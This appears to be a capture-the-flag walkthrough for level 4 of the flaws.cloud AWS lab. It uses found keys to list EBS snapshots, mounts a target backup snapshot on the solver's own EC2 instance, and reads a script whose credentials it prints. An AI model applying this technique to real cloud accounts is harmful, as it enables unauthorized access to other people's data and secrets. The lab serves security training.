Set the region name and keys to what was found previously (`us-west-2`)
```
aws configure
```

![[c78d98d133a1c962323eb7dea3b0fa28-1.png]]

List snapshots that user can access in the region
```
aws ec2 describe-snapshots --owner-ids self  --query 'Snapshots[]' --region=us-west-2
```

![[1e5a8a9a8ce7aa3e85ab190c07757717-1.png]]

With your free tier AWS account, make an EC2 instance in the same region (us-west-2) with Ubuntu and save the generated private key for SSH access later. Then, create a volume with the snapshot id of the flaws backup (make sure it matches the Availability zone of the EC2 instance, like us-west-2c) and attach it to the EC2 instance.

![[bfd382cef7435b9105e21c7e7d7dde77-1.png]]

![[fadf83d56b4f359caf27723d706eba30-1.png]]

![[617eb3693b42a97572ef85f7aceb78d6-1.png]]

Next, SSH into your EC2 instance using the generated private key. 
```
chmod 400 aws_key_1.pem
ssh -i "aws_key_1.pem" ubuntu@ec2-your-ip.us-west-2.compute.amazonaws.com
```

Mount the EBS Snapshot volume. 
```
lsblk
sudo mkdir -p /mnt/ebs
sudo mount /dev/xvdf1 /mnt/ebs
```

![[503df9e3d54a2a5ef01d9dc26d1ab0cf-1.png]]

In `/mnt/ebs/home/ubuntu` you can find two interesting things, one of which is a script that includes the credentials for access to the EC2 web page listed on this level to get access to level 5.

![[df37e9d7dbe2dba359f6d004c4002df9-1.png]]

Creds: 
```
flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```

![[9043c4c06410af850a116dcd63e4a5db-1.png]]